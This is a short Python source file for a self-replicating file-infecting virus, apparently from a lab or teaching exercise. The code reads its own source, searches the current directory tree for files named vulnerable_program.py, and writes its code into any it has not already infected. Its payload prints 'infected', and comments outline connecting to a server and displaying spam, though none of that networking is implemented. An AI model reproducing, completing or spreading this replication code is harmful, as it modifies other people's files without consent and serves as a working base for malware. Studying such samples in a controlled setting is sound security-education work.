


## VIRUS BEGIN ##
import re
import sys
import glob
import os
import victim_set
import socket
# from victim_set import *

# get a copy of the virus
v_code = []
v_file = open(sys.argv[0], "r")
v_lines = v_file.readlines()
v_file.close()

virus = False
for v_line in v_lines:
    if re.search('## VIRUS BEGIN ##', v_line):
        virus = True
    if virus:
        v_code.append(v_line)

# find victims in the vulnerable set
victims = []
for root, dirs, files in os.walk(os.path.curdir):
    for f in files:
        if f == "vulnerable_program.py":
            # print("victim is: " + f)
            victims.append(f)

#infect
for v in victims:
    v_file = open(v, "r")
    v_lines = v_file.readlines()
    v_file.close()
    infected = False
    for line in v_lines:
        if re.search('## VIRUS BEGIN ##', line):
            infected = True
            break
    if not infected:
        v_file = open(v, "w")
        v_code.extend(v_lines)
        v_file.writelines(v_code)
        v_file.close()

#payload
print("infected")
## open socket - check ip address and send over???

## connect to our server
## receive spam message and desplay

## VIRUS END ##

